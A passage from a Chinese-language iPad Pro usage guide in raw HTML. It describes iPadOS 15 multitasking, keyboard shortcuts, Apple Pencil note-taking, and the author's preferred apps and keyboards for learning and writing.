这又是目前体验最佳的数字组合。尤其是第二代 Apple Pencil 出现，解决了充电和收纳问题以后，是目前唯一选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-82ba870901eee4413ea423b6ae64bd1c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-82ba870901eee4413ea423b6ae64bd1c_r.jpg\"></figure><p>比如，如果你的工作大多数在路上，那么 5G 蜂窝网络配合上妙控键盘可以让你很好的在更加多元的场合中工作。</p>\n<p>而且随着 M1 芯片的加入到 iPad 阵营中，这让 iPad Pro 的未来想象更加多了起来。越来越多的软件开发者很可能会在未来几年里让 iPad Pro 的整个软件生态有新变化。游戏就是一个现成的例子，现在越来越多的「大作」开始在 Mac 和 iPad 双平台发力，我们甚至是已经开始可以用手柄在iPad 上玩「鬼泣」新作。而游玩的方式也很「iPad」，你可以配合主流主机的手柄，让 iPad 本身再化身游戏机。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c4b88ab5fb931e832911558557d8f7a7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4991\" data-rawheight=\"3327\" class=\"origin_image zh-lightbox-thumb\" width=\"4991\" data-original=\"https://pic4.zhimg.com/v2-c4b88ab5fb931e832911558557d8f7a7_r.jpg\"></figure><p>这就是为什么我说不要抱着代替 Mac 的心态去看待 iPad Pro。因为某种意义上来说，Mac 的形态只是 iPad Pro 的形态之一。二者最大的差异在于，Mac 依然是传统键鼠输入方式的组合，而 iPad Pro 目前最大也是最为独特的优势是这一根 Apple Pencil。</p>\n<p>对于这根 Apple Pencil 并不是单纯的只为绘画和设计相关服务，而是只要你的工作学习生活中需要「一只笔」，它大概率都是你的最佳选择。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-974bd2282b260b19b333aa57fa72f64e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-974bd2282b260b19b333aa57fa72f64e_r.jpg\"></figure><p>从软件和系统上，iPad 也有着自己的独特之处。我们都知道 iPadOS 本身是由 iPhone 的 iOS 演化而来。所以它本身的风格延续了触控的沙盒机制。最简单的说法就是，它本身是由一个一个 App 为核心组成的生态。因此某种意义上来说，我们能否进行什么样的工作，能够多快的进行工作，都是由某一个 App 决定的。</p>\n<p>这样的沙盒机制有好有坏，坏处就是它缺乏软件之间的联动，使用起来并不自由，但是好处就是它可以让你更加专注，不受打扰。这一点也会在后面的分享中有所展现，你会发现使用 iPad 时，我们更能集中注意力。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5f96e77aaa2d0f18f78e214d748baf6f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-5f96e77aaa2d0f18f78e214d748baf6f_r.jpg\"></figure><p>好了，在认识短暂的认识 iPad 以后，我们就开始进入本篇文章的正题，iPad Pro 使用指南。</p>\n<p>需要说明的是，在使用指南部分，不仅仅是我自己的一些简单经验。因为工作的原因，我也接触到许多不同的 iPad Pro 用户，他们可能是一些艺术家、插画家、电影工作者、学生等等。我也会把他们的一些使用经验糅合其中。</p>\n<p>希望能够对你有所帮助。</p>\n<h3>横、竖都好用</h3>\n<p>在这一部分开始之前，还是需要再进行一次强调：<b>不要抱着用 iPad 代替 Mac 的想法来使用 iPad</b>。</p>\n<p>这还真的不是说，iPad Pro 不能代替 Mac 的一些工作。而是如果你使用 iPad 时，却依然沿用 Mac 的使用习惯和逻辑，自然会遇到各种阻碍。而对于任何一样全新的工具，很多时候固有习惯才是我们最大的障碍。</p>\n<p>说出来你可能不信，现在的很多小孩子，甚至已经不知道什么是键盘和鼠标，面对一块屏幕，他们的第一直觉是上去戳一下。时间在变，事物在变，换个新的方式，也许会给自己带来许多新东西。</p>\n<p>尝试改变，永远比循规蹈矩更有趣。</p>\n<h3>基本使用逻辑</h3>\n<p>通过第一部分的内容，我们已经很明确的知道 iPad 的生态核心是「每一个 App」。所以其实在这一部分的工作流都是围绕某一个 App 展开。而随着这几年 iPadOS 的逐渐进步，尤其是 iPadOS 15 出现以来，多个 App 之间的联动使用也更紧密。所以这也可以让我们的工作流相对变得完整。<br></p>\n<p>所以在具体工作流开始之前，我们先来学习一下 iPadOS 15 中非常重要的 App 之间的联动方式，或者是多任务逻辑。</p>\n<p>注意，本文中所有的操作都是基于 iPadOS 15，目前 iPadOS 15 依然在公测阶段，还没有正式上线。正式版预计会在九月份左右上线，但现在你可以进行升级尝试，从我的数月使用经验来看，已经非常稳定，当然依然具有一定风险，不着急可以等待九月。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>首先我们要用好底部的程序坞（Dock），iPad 的工作流几乎都需要围绕程序坞展开。下图就是我自己配置的 Dock 栏，大致可以放置 20 个软件。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-dd0a04b4ece8686d952eeb7e9101bd4c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic1.zhimg.com/v2-dd0a04b4ece8686d952eeb7e9101bd4c_r.jpg\"></figure><p>你可以在阅读这一章节以后，梳理一下自己常用的软件，然后按照使用频率在程序坞中进行排布。为什么说它重要呢，因为在上一代 iPadOS 系统中想要软件分屏，只能是通过唤出程序坞来选择，非不在程序坞软件想要分屏必须在桌面上提前打开。</p>\n<p>在 iPadOS 15 中这一问题得到了改善，现在我们可以直接通过点击屏幕上方的「三个点」来选择不同的分屏方式。这「三个点」我认为非常有必要，因为在以往分屏操作因为没有任何提示，过于抽象，很多人都会认为过于复杂，现在「三个点」出现以后就很直观。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-e7da8380b2ba52d0ab9d635269e48344_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic1.zhimg.com/v2-e7da8380b2ba52d0ab9d635269e48344_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic1.zhimg.com/v2-e7da8380b2ba52d0ab9d635269e48344_r.jpg\"></figure><p>另外，现在的分屏也更加自由。我们可以一个软件多次分屏，比如两篇 Word 文档同时打开。另外在多任务后台中我们还可以更加自由地对于多屏排列自由组合。可以直接通过手指像「上帝一样」改变他们的顺序。</p>\n<p>但分屏如此自由的情况下，程序坞依然重要。因为大多数情况下，最好的方式还是使用程序坞启动分屏，而且如果你想要分屏之后的第三个屏幕，也就是浮窗，依然需要通过唤出程序坞来选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4dcf91d245509bfd8cb52e6d5895d288_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic1.zhimg.com/v2-4dcf91d245509bfd8cb52e6d5895d288_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic1.zhimg.com/v2-4dcf91d245509bfd8cb52e6d5895d288_r.jpg\"></figure><p>浮窗也是一个很容易让人忽视的功能。尤其是如果你是一个在使用某个软件的同时需要多个软件参考的用户，就需要在浮窗上多下点功夫。因为浮窗允许你多个软件堆叠，然后通过像是 iPhone 切换后台一样，直接切换不同的应用参考。</p>\n<p>对了，不同软件之间文件是可以直接拖拽的。这也某种程度上可以增加一些效率。比如我自己给我的文章配图的时候，就可以照片软件里直接拉选。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d2a26e5f6456e9093277e64e79cc85a4_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic1.zhimg.com/v2-d2a26e5f6456e9093277e64e79cc85a4_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic1.zhimg.com/v2-d2a26e5f6456e9093277e64e79cc85a4_r.jpg\"></figure><p>iPadOS 15 另一个便利之处就是，如果你对某个软件进行了分屏操作，系统会自动记忆分屏。当你再次进入软件时，它会给你所有的分屏预览让你选择。所以某种意义上，这也是在记录你的工作流。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b103f29d91a05c825d4e0cbdcae2f1f6_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic3.zhimg.com/v2-b103f29d91a05c825d4e0cbdcae2f1f6_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic3.zhimg.com/v2-b103f29d91a05c825d4e0cbdcae2f1f6_r.jpg\"></figure><p>另外，一些快捷方式也可以让你事半功倍。</p>\n<p><b>键盘快捷键</b></p>\n<p>​如果你同时是 Mac 用户，那么快捷键就相对简单了，因为 iPadOS 和 macOS 的很多快捷键唤出功能是一样的，你可以尝试下。如果你从未接触苹果生态的快捷键也没有关系，iPadOS 15 提供了一个非常直观的快捷键介绍：</p>\n<p>在任意系统中长按 Command 按键，就会显示对应的快捷键列表。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9386245f7931aea2bd419830c03a6d58_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4951\" data-rawheight=\"3301\" class=\"origin_image zh-lightbox-thumb\" width=\"4951\" data-original=\"https://pic1.zhimg.com/v2-9386245f7931aea2bd419830c03a6d58_r.jpg\"></figure><p>比如，我们在使用「文件」时，就可以直接按下 Command 看到各种快捷键。为了让你快速上手，所以在这里我提供了几个常用全局快捷键：</p>\n<ul>\n<li>Command + Tab ：多任务切换</li>\n<li>Command + 空格 ：快速搜索</li>\n<li>Command + H：返回桌面</li>\n<li>Command + N：新建（文件）</li>\n<li> +A ：显示 / 隐藏 Dock</li>\n<li> +⬆️：多任务后台（ +↔️ 切换任务）</li>\n</ul>\n<p>熟练以上几个快捷键后，基本上就可以不用抬手，使用妙控键盘的触控板和键盘就可以完成 iPad Pro 的分屏及各类操作。</p>\n<p>当然，快捷键操作在任意外接键盘上都有效，不仅仅是妙控键盘。</p>\n<p><b>Apple Pencil 下的快速笔记</b></p>\n<p>如果你的 iPad Pro 是 Apple Pencil 为核心，那么速记功能一定是你的需求之一。</p>\n<p>息屏状态下拿起 Apple Pencil 点击屏幕可以快速进入备忘录，不需要额外解锁打开备忘录的操作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-77c3a1624c5b884a0d5f70068db75d8f_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic4.zhimg.com/v2-77c3a1624c5b884a0d5f70068db75d8f_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic4.zhimg.com/v2-77c3a1624c5b884a0d5f70068db75d8f_r.jpg\"></figure><p>在 iPad 任意界面，从右下角向左上方滑动，就可以呼出快速备忘录。这一步甚至无需使用 Apple Pencil。快速备忘录记录的内容也很多样，可以直接将正在浏览的网页地址一键插入备忘录，然后再做各种摘录。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1388733fa9fccac469c3057c444f2505_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic2.zhimg.com/v2-1388733fa9fccac469c3057c444f2505_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic2.zhimg.com/v2-1388733fa9fccac469c3057c444f2505_r.jpg\"></figure><p>这两个操作可以保证你在任何情况下以最快速度开始记录。而且现在的备忘录文字识别功能异常强大，只要你的笔迹不是过于潦草，系统都可以自动识别文字。尤其是一长串的数字，都可以直接复制粘贴。</p>\n<p>所以这也带来另一个功能，在 iPad 的全局任何一个输入框都可以直接通过手写文字的形式直接输入。比如着急回一个微信，身边还没键盘，直接在输入框上写几笔即可。</p>\n<p>在细分的工作流之前，我先来回答一些具体的问题：</p>\n<p><b>1. 软件下载：</b>如果我没有特别说明，那么这些软件都可以在国区 App Store 下载。如果需要跨区下载，我会特别标注，如果收费政策比较苛刻我也会注明。</p>\n<p><b>2. 付费：</b>虽然 2021 年，大家对于软件付费应该习惯了，但是依然会有人对于「我用一个软件还要付费」来质疑。也恳请大家不要乱评价一个软件的收费标准，因为对于效率和专业软件来说价值往往取决于使用者本身。</p>\n<p>那么正式进入具体工作流。</p>\n<h3>学习</h3>\n<p>iPad 绝对是最好的学习工具。这种学习不仅仅是对于各位在校生，只要你是不断吸收新事物，iPad 都可以帮助你更好的学习。在这里的学习并不单纯的只获取知识，任何对于「头脑」的输入，都是一种学习。比如因为我的工作之一就是摄影，所以获取灵感也是我学习的一种方式。<br></p>\n<p>所以，iPad 在我的学习过程中有三个非常重要的作用：收集、汇总、归纳。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-a9c8c0b6eb9737e681c8288783ac8bce_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-a9c8c0b6eb9737e681c8288783ac8bce_r.jpg\"></figure><p>收集是指一切形式的知识内容寻找，比如对于平面摄影，我最常用的灵感收集软件就是 Instagram 和 Pinterest。</p>\n<p>Instagram 不用说了，完全以图片为核心的社交平台。我基本上使用 Instagram 的唯一目的就是看看国外摄影师都在拍什么。</p>\n<p>但是我们都知道 Instagram 是没有 iPad 版软件的。但是没有关系，这里有一个小知识，这就是每一个网页是可以直接作为应用在桌面上。只要我们在 Safari 中访问 Instagram 网页，登录以后添加到桌面上，这样每次都可以像一个应用一样，直接在桌面上打开。</p>\n<p>使用 iPad 版 Instagram 的好处就是图片更大，细节也就相对更丰富。摄影师都知道，很多时候尺寸决定一切，一张图的观感和尺寸有着非常明显的关联。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-9c62cb501a7137b389cb1b78a72bd1f3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-9c62cb501a7137b389cb1b78a72bd1f3_r.jpg\"></figure><p>所以同理 Pinterest 也是如此。不过好在 Pinterest 是有软件的，所以使用起来就更加方便的。对于摄影师和设计师来说，我想 Pinterest 都很熟悉了，所以也就没有必要过多的介绍。</p>\n<p>如果遇到不错的照片，很多时候我就会直接下载下来，保存到 iPad 中，这样可以方便我随时观看。这里还有一个很重要的技巧：</p>\n<p>截屏并标记。</p>\n<p>比如你在看视频过程中遇到一些你认为很必要的知识点，或者是遇到很不错的照片想要保存，我的建议就是直接快速截屏。截屏之后可以用 Apple Pencil 标记。尤其是如果是一些关于激发的灵感，那么还可以写下来自己的一些感受。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d7f0a595075c5968c7f1e0ffca824ed7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-d7f0a595075c5968c7f1e0ffca824ed7_r.jpg\"></figure><p>最后切记千万不要直接存储到相册里，因为这样你可能再也不会去看它了。所以最好的方式是直接存储到文件中的一个特定文件夹。比如我会建一个灵感的文件夹。专门存储这些我收集的碎片。</p>\n<p>当然视频网站也是一个很好的学习途径。</p>\n<p>基本上我主要看的是 Youtube 以及 B 站。提到 Youtube 就不得不说起科学上网，但显然我无法在这里分享具体的方式。但是 iPad 科学上网本质和 iPhone 一样，我也只能说这么多了。</p>\n<p>在通过上述的途径收集以后，接下来就是汇总。</p>\n<p>这里最常见需要汇总的资料就是 PDF 以及各种文档。那我最为推荐的软件有两个：</p>\n<p>如果你更多是单纯阅读，同时做少量的批注，那么我推荐你使用 PDF Expert ，这款软件基本上能够实现 PDF 的所有功能。</p>\n<p>如果你是书写和摘录为主，那么我建议你使用 GoodNotes，因为它本身就是一个笔记软件，可以让你有在 PDF 的书写上有着最丰富的体验。这也是我自己最为常用的汇总软件，许多摄影课程都会有 PDF 总结，尤其是一些国外的摄影师。我使用 GoodNotes 因为文件夹可以很丰富，所以我可以直接一目了然的进行管理。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b9b5d5a05c623a31ba6556b7702ffea1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-b9b5d5a05c623a31ba6556b7702ffea1_r.jpg\"></figure><p>当然如果是视频资料的汇总，肯定就涉及到播放器的问题。我在 iPad 上使用最多的播放器是 VLC，基本上所有的格式都能够播放，而且也支持外挂字幕，对于多语言学习的用户还是非常友好的。</p>\n<p>最后就是归纳。这里的归纳是指在现有的资料中提取精髓部分，比如最为直接的笔记。</p>\n<p>说到记笔记，我觉得也就没有什么可以说的了，GoodNotes 以及 Notability 这两个软件可以说人尽皆知。选择哪一个都没有什么问题，都一样好用，只不过我自己可能更喜欢  GoodNotes。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2b43dc0b33bb79face41de48c633e85b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-2b43dc0b33bb79face41de48c633e85b_r.jpg\"></figure><p>除了单纯地誊写，我也认为制作思维导图也十分有用，它可以让我们从全局来思考。比如这篇文章在构思之前我就使用 MindNode 来构思了一个思维导图。我一直都很喜欢 MindNode，一方面它的使用方式非常简洁，另一方面颜值很高，可以直接加入到各种类型的展示中去。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e714123d6fff12ab57ce73dd7a00fd86_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-e714123d6fff12ab57ce73dd7a00fd86_r.jpg\"></figure><p>除了 MindNode 以外，还有一款非常「学生向」的学习工具：MarginNote 3。</p>\n<p>这款软件可以说是完全重塑了学习方法，它有着你学习所有需要的工具。一方面它可以识别各类文档内容，让你快速建立思维导图。另一方面它还能直接在文件中绘制，添加备注书签。</p>\n<p>总之，它是一款值得你完全信任的纯粹学习工具，对于任何正在上学，并且伴随着大量电子文档的学生可以说是上佳的选择。</p>\n<p>都说学无止境，以前只是觉得鸡汤而已。工作几年，愈发明白「学习能力」往往就是决定事业上限。放眼望去，iPad 配合 Apple Pencil 这个组合，可以说是最好的学习工具，一定不为过。你想在学习领域找到一个与之匹敌的产品，还真的没有。</p>\n<h3>写作</h3>\n<p>我觉得 iPad 是最好的写作工具。</p>\n<p>这里的写作不是指「单纯的码字」，也不是指「文字的输出和排版」，而是纯粹的文字创作。最直接的例子就是各类作家或者是说写手。我身边认识的几个编剧，基本上都在使用 iPad 写作。从我自身的经验来看，iPad 之所以受到越来越多的写作者的追捧最重要的原因它能够让写作者保持专注。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-ede3e925f59389cc920c7fe0ddb7d07b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-ede3e925f59389cc920c7fe0ddb7d07b_r.jpg\"></figure><p>正如前面所说，在使用 iPad Pro 写作时，iPadOS 专注于某一个软件的特性反而成为了一种优势。</p>\n<p>我自己的写作工作流主要包含输入和输出两个部分。</p>\n<h3>输入：获得灵感</h3>\n<p>这里基本上就是指我自己的文字内容消费。</p>\n<p>我自己是不太喜欢今天「依托社交网络」的碎片阅读方式，所以 iPad Pro 对我来说输入方式基本上杂志为主。</p>\n<p>基本上如果你愿意，今天大部分的杂志都可以寻找到电子版。我说 iPad 是最好的电子杂志阅读器应该是没有人反对的。尤其是杂志图文混排的形式，iPad 才能更好的呈现。</p>\n<p>而且一些经典杂志，在 iPad 上都是有订阅的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-de6fb6d66bdf3b95742820d967859529_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-de6fb6d66bdf3b95742820d967859529_r.jpg\"></figure><p>比如我自己就是在英区的 App Store 上订阅了《New Yorker》和《Wired》。另一方面有一些千奇百怪的杂志也是可以各种方式获得，这里我也就不讨论盗版不盗版的问题了。我的看法就是：</p>\n<p>能交费的我统统买正版，没有交费渠道的看了也不是什么罪过，都是学习。</p>\n<h3>输出：写作软件</h3>\n<p>别再用 Word 写作了。</p>\n<p>尤其是如果你的工作是创意类型的文字输出，就千万不要使用 Word。我们需要知道的 Word 仅仅是一个文档排版软件。它的作用是提供一个文件为单位的文档规格。它的目的是一个一个文件，并不是一篇一篇的文章。</p>\n<p>而且它最大的意义是「整理文字」，也就是调整文章格式，所以这就让它的功能非常复杂。这种复杂其实会分散我们的注意力。但是对于写作过程来说，什么都不需要，你只需要：</p>\n<p>写出来。</p>\n<p>所以这里就需要一些沉浸感很好的写作软件，了解我的人都知道我肯定是首推 Bear（熊掌记）。这篇文章就是我在熊掌记上完成的。</p>\n<p>虽然 Bear 给自己定位是笔记软件。这里的笔记特别说的是文档笔记而不是手写笔记。但是这款软件在写作沉浸度上可以说是绝对最佳。它非常简洁，整个软件由三个核心部分组成：分别是文件夹边栏、标题边栏以及写作窗口。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-cd010d67956737dc0693ecb186e01ff5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-cd010d67956737dc0693ecb186e01ff5_r.jpg\"></figure><p>这款软件的好处就是：</p>\n<p><b>1. 颜值极高</b></p>\n<p>整个软件设计审美非常高，简洁而优雅。你可以自由选择已经内置好的主题，我自己最喜欢的主题就是「光天化日」。是的，这款软件的主题名字就是这么的中二。</p>\n<p><b>2. 随开随用</b></p>\n<p>这也是此类写作软件沉浸感的重要来源。当我们使用 Word 写作时，我们需要建立一个文件的过程。一开始要新建，最后还需要保存。但是熊掌记完全没有所谓的文件概念，只要你点进去就可以开始写，不想写了合上 iPad 即可。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7d45044f5a6c7291fad4bcaff6e5715b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-7d45044f5a6c7291fad4bcaff6e5715b_r.jpg\"></figure><p><b>3. 完全基于 iCloud 的跨设备云同步</b></p>\n<p>你可以在苹果生态的 Mac、iPhone 中下载熊掌记。而且所有写作进度完全同步。所以你可以在手机上记下自己的灵光一闪，然后回到家在 iPad 或者 Mac 上继续完善。</p>\n<p><b>4. 基于 Markdown 语言的全格式输出</b></p>\n<p>如果你经常大量写作，但是还不知道 Markdown 语言，我建议你可以花点时间了解一下，这里我就不赘述了。但是需要说明的是，熊掌记在完成写作以后只能简单的排版工作。如果你需要更加复杂的排版，那么可以按照你需要的格式进行输出，比如 Word。</p>\n<p>这也是我自己写作工作流中最为重要的一个核心：<b>写排分离。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-20b60f43ad07c23282fe17e4e2dfa249_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-20b60f43ad07c23282fe17e4e2dfa249_r.jpg\"></figure><p>写作的时候，只是纯粹的写作，排版的时候，就纯粹的排版。</p>\n<p>当然我知道对于大多数人来说还是习惯用 Word。所以这里就简单来说说 Office 。经过几年的演变，iPad 版 Office 三件套已经逐步成熟。尤其是 Word 和 PowerPoint，基本上可以满足大部分需求。</p>\n<p>但如果你的工作就是在 Word 中排版，那么显然 iPad 不适合你，老老实实用电脑。</p>\n<p>Excel 简单地看看表还可以，但类似数据透视这类功能依然无法实现。我自己是订阅了 Office 365，当然也有相对性价比的选择就是 WPS。iPad 版本的 WPS 整体完成度还是极高的，很大程度上能够还原桌面端的功能。</p>\n<p>所以如果你并不想在办公软件上花太多钱，WPS 也是一个很好的选择。</p>\n<h3>选个好键盘</h3>\n<p>除了软件，我自己的一个重要经验是，选择一块好的键盘也是关键。</p>\n<p>好消息是，现在 iPad 几乎兼容任何形式的键盘。蓝牙键盘就不用说了，直接配对就可以使用。有线键盘也可以通过 USB-C 转 USB-A 的转接线来使用。所以如果你的写作原有习惯的键盘都可以在 iPad 上沿用。</p>\n<p>我自己其实折腾过很多键盘，甚至是以 iPad 为核心写过一个键盘推荐指南。因此在这里我不再推荐具体的键盘，而是直接分为两种形式。</p>\n<p><b>外接键盘</b></p>\n<p>外接键盘最大的好处就是可以按需挑选。无论你喜欢什么样的键盘，都可以自己选择。对于一个常年码字的人来说，肯定是有自己的键盘偏好的。</p>\n<p>我自己是逐渐的从机械键盘过渡到 HHKB 静电容的。一开始我可能更加注重的是一种所谓的快感，但是慢慢的你会发现疲劳度是一个非常重要的参考指标。而静电容我觉得整体手感就会非常温柔，与此同时还能保证一定的打字快感，是一个很好的平衡。而且 HHKB 的键盘布局更加紧凑，整体的造型复古好看。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-bbe11bef5bc7832886e159a7f49581c9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-bbe11bef5bc7832886e159a7f49581c9_r.jpg\"></figure><p>有人说 HHKB 是烧键盘的终点，一开始以为是戏谑，不过现在我还真的再也没有对其它任何一款键盘心动过。</p>\n<p>所以，如果让我来推荐一款外接键盘的话，我还是推荐 HHKB。</p>\n<p>当然如果你觉得 HHKB 价格高昂，市面上的键盘选择还是非常多的。你可以直接看相关的键盘推荐。</p>\n<p>不过当你使用外接键盘时，就需要注意你使用的场景将会非常固定。这种固定并不是一定要坐在某一个地方不动，而是说你的使用场景不是动态的。比如去咖啡厅写作，那么一块 HHKB 是不错的选择。但是如果你是出差，或者是参加各种会议，那么 HHKB 就会各种不便利。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d048b552e7b029b755fe0c8b796f37ed_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-d048b552e7b029b755fe0c8b796f37ed_r.jpg\"></figure><p>所以只有当你确定自己的写作场景是很固定时，才能主动选择外接键盘。</p>\n<p><b>妙控键盘</b></p>\n<p>一开始我对于妙控键盘并不感冒，这种不感冒有很多原因，有价格的因素，有手感的因素。但是用着用着慢慢发现，想要高效使用 iPad，尤其是移动场景居多时，妙控键盘真的是最好的选择。</p>\n<p>想用的时候，它都在。我不是没有尝试过带着 HHKB 出差，但是总是会遇到我想写但是 HHKB 在包里、行李箱里、酒店里。总之，就是不在身边。但是妙控键盘，因为保护壳的设计，所以无论任何时候只要你想用 iPad 开始写，键盘就在。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-678c2edaa64f650f6bc75f6681963c9b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-678c2edaa64f650f6bc75f6681963c9b_r.jpg\"></figure><p>触控板的确会提升效率。如果你使用其它外接键盘，很多操作依然要配合触屏来完成，这样的抬手操作还是会累。使用妙控键盘的触控板就可以彻底不需要抬手操作，减轻不少压力。所以，如果你的工作是动的多，也不要觉得妙控键盘贵不贵的问题，就认为它是 iPad 的一部分就好了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-49c93d221f57479df7d6a5fe1aaddb1d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" 